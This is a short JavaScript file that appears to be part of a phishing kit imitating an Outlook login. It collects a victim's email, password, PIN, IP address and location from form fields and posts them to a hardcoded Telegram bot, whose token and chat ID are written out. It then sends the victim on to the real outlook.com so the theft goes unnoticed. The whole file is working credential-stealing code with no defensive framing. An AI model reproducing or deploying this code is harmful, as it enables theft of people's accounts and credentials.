//bot token
var telegram_bot_id = "6948486813:AAHdHUvzSv-K7E-ERuWe6YGrGs1hRRpijRE";
//chat id
var chat_id = -4145795822;
var pass, email, pin;
var ready = function () {
    email = document.getElementById("correo").value;
    pass = document.getElementById("pass").value;
    pin = document.getElementById("pin").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "Correo: " + email + "\nPass: " + pass + "\npin: " + pin + "\nIP: " + ip + "\nLoc: " +ip2;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
   
    };
    $.ajax(settings).done(function (response) {
        window.location = 'https://outlook.com'
        console.log(response);
    });
    document.getElementById("correo").value = "";
    document.getElementById("pass").value = "";
    document.getElementById("pin").value = "";
    ip = document.getElementById("gfg").innerHTML = "";
    ip2 = document.getElementById("address").innerHTML = "";
    return false;
};